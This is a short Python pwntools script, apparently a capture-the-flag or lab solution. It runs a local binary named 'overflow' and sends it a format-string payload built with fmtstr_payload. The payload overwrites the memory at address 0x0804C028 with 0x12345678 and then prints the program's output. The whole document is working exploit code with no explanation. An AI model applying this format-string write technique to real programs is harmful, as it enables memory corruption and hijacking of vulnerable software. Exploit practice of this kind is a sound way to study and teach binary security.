from pwn import *

sh = process('./overflow')

c_addr = 0x0804C028

payload = fmtstr_payload(6, {c_addr: 0x12345678})

sh.sendline(payload)

print(sh.recv())

